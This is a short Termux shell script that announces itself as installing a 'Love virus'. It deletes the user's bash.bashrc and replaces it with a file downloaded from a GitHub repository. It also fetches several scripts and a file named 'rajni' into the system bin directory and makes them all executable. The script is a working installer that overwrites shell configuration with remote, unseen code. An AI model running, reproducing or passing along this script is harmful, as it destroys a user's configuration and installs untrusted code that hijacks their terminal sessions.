clear
echo " Installing Love virus"
apt update
apt install espeak python -y 
cd /data/data/com.termux/files/usr/etc
rm bash.bashrc
wget https://raw.githubusercontent.com/Simplehacker1Community/love-virus2/simplehacker/bash.bashrc 
cd /data/data/com.termux/files/usr/bin
wget https://raw.githubusercontent.com/Simplehacker1Community/love-virus2/simplehacker/logo.py
wget https://raw.githubusercontent.com/Simplehacker1Community/love-virus2/simplehacker/loveyou.txt
wget https://raw.githubusercontent.com/Simplehacker1Community/love-virus2/simplehacker/loveyou2.txt
wget https://raw.githubusercontent.com/Simplehacker1Community/love-virus2/simplehacker/love.sh
mkdir rajni
cd rajni
wget https://raw.githubusercontent.com/Simplehacker1Community/love-virus2/simplehacker/rajni
clear
chmod +x * rajni
mv rajni ../

clear
echo " installed love virus"
